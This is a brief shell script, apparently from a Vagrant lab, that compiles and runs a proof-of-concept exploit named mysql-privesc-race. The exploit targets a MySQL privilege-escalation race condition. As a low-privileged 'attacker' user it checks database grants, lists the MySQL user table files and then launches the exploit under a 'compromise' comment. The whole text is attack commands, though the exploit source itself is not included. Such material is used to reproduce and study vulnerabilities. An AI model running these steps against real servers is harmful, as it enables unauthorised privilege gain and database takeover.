cd /vagrant/provision 
sudo gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient

# as attacker
sudo -u attacker id
sudo -u attacker mysql -uattacker -ppocsql -hlocalhost pocdb -e 'show grants;'
sudo -u attacker ls -l /var/lib/mysql/mysql/user.*

# compromise
sudo -u attacker time ./mysql-privesc-race attacker pocsql localhost pocdb